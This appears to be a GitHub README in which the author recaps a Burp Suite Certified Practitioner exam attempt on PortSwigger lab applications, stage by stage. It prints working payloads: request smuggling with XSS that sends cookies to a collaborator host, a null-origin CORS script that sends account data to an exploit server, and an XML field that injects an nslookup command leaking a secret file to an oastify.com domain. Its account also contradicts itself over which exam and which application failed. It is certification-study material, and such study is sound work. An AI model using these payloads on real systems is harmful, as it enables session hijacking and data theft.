# BSCP2-Recapitulation
This Repo contains Burp Suite Certification Practitioner Recapitulation of Mine


## BSCP 2<sup>nd</sup> Exam
I have taken my first BSCP exam on **January 1st, 2025**. I failed on App 2 without success to address any vulnerabilities. Please find the details in the following points:

### Application 1 - UNEXPLOITED 😢 (CLOSE ENOUGH)
- Stage 1:
  - Features:
    The features mentioned here are the visible functional that we can exploit for stage 1
    1. Search in Homepage
    2. Comment on the Blog Post
    3. Login Form
    4. Forgot Password
    5. We can see `userAgent` attribute inside the `Comment` form.

  - Strong Potential Vulnerability:
    - HTTP Req smuggling to deliver reflected XSS
    - HTTP Req smuggling to deliver to capture other user's request
   
  - Actual Vulnerability: HTTP Req Smuggling Dual-chunk with exploiting the reflected XSS in `userAgent`
    > I found this vulnerability based on the scan result using `HTTP Request Smuggling` extension scanner.
  - How to trigger for the first time:
    - Observe we can trigger xss vulnerability with manipulating the `userAgent`
    - Send the following request and Observe we get `Timeout` response in every our second request.
      ```HTTP
      POST / HTTP/1.1
      Host: webId.web-security-academy.net
      Cookie: YOUR_COOKIE
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 858
      Transfer-Encoding: chunked
      Connection: close
      Transfer-encoding: identity

      3
      x=y
      0\r\n
      \r\n
      ```
  - Exploit `HTTP Request Smuggling Dual-Chunk` using the following payload:
    ```HTTP
    POST / HTTP/1.1
    Host: webId.web-security-academy.net
    Cookie: YOUR_COOKIE
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 858
    Transfer-Encoding: chunked
    Connection: close
    Transfer-encoding: identity

    3
    x=y
    0

    GET /post?postId=2 HTTP/1.1
    User-Agent: a"/><script>document.location='http://collaboratorURL/?c='+document.cookie;</script>
    Cookie: YOUR_COOKIE
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 8

    foo=
    ```

- Stage 2:
  - Features:
    The features mentioned here are the additional visible functional after passing the `stage 1`
    1. Update Email.
    2. `isLoggedin` Cookie Parameter.
       
  - Vulnerability: Exploit the `forgot password` function using the `isLoggedin` flaw mechanism. Please refer [here](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file#10-csrf-refresh-password-isloggedin-true)
  - How to Exploit:
    1. Send `forgot password` request to the **Repeater**
    2. Change the `username` value in the body request to `adminsitrator`
    3. Observe the result with statusCode `200` and **administrator**'s cookie is reflected in the response.
   
- Stage 3:
  - Features:
    The features mentioned here are the visible functional in `Admin Panel` Menu
    1. XML User Import 
  - Vulnerability: XXE Injection with dtd blid out of band
  - How to Trigger:
    Please the following payload and observe you get an error due to the character length:
    ```XML
    <?xml version="1.0" encoding="UTF-8"?>
    <users>
      <user>
        <username>Exp1</username>
        <email>exp1@domain.com</email>
      </user>
     <user>
        <username>Exp2</username>
        <email>exp2@example.com%26`nslookup -q=cname $(cat /home/carlos/secret).bfuxae8oi1ac1lrm5l2hgmwh68c00qof.oastify.com`</email>
      </user>
    </users>
    ```
  - You have to exploit using [XXE with dtd out of band](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#dtd-blind-out-of-band). Unfortunatelly, I was late realizing this vulnerability and didn't have enough time to craft the payload.

### Application 2 - EXPLOITED ❤️‍🔥
- Stage 1:
  - Features:
    The features mentioned here are the visible functional that we can exploit for stage 1
    1. Search in Homepage
    2. Login Form
    3. Forgot Password
          
  - Vulnerability: Brute Force Username and Password regarding the difference of response message in `forgot password` feature.
  
  - How to trigger for the first time:
    - Brute force the `username` in `forgot password` feature and Observe the difference of response message.
    - Brute force the `password` in `login` feature using the valid `usernames` from the previous step. Observe we get the response with **statusCode** `302`.

- Stage 2:
  - Features:
    The features mentioned here are the additional visible functional after passing the `stage 1`
    1. Update Email.
       
  - Vulnerability: Trusted Null Origin. Please refer [here](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#null-origin-trusted)
    > Observe the app send a request to `/accountdetails`.
  - How to Exploit:
    1. Observe we can send a request to `/accountdetails` with `origin: null` header.
    2. Use exploit server to send the malicious script as follows:
        ```HTTP
        <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://0ab400a303b1b49583b01a7600a5009f.web-security-academy.net/accountdetails/?posix_timestamp=1735675249959',true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location='https://exploit-0aae000c0358b48483a01953017a0053.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
        };
        </script>"></iframe>
        ```
- Stage 3:
  - Features:
    The features mentioned here are the visible functional in `Admin Panel` Menu
    1. XML User Import
  - Vulnerability: XXE Injection
  - How to Exploit:
    I used the following payload to exploit this vulnerability (I URL-Encoded the Ampersand(&) character):
    ```XML
    <?xml version="1.0" encoding="UTF-8"?>
    <users>
      <user>
        <username>Exp1</username>
        <email>exp1@domain.com</email>
      </user>
     <user>
        <username>Exp2</username>
        <email>exp2@example.com%26`nslookup -q=cname $(cat /home/carlos/secret).bfuxae8oi1ac1lrm5l2hgmwh68c00qof.oastify.com`</email>
      </user>
    </users>
    ```